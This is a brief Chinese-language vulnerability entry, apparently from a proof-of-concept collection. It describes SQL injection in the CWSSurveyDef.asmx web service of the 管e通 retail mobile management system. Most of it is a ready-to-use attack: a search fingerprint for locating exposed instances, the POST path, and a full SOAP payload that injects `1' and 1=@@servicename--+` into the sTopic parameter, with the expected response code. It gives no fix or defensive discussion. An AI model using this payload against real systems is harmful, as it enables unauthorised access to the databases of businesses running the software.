# 管e通零售移动管理系统软件CWSSurveyDef.asmx存在SQL注入漏洞

管e通零售移动管理系统软件 ｜ SQL注入 ｜ —
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /enjoyRMIS_WS/WS/BaseInfo/CWSSurveyDef.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<CheckHaveAnswer xmlns="http://tempuri.org/">
<sTopic>1' and 1=@@servicename--+</sTopic>
</CheckHaveAnswer>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200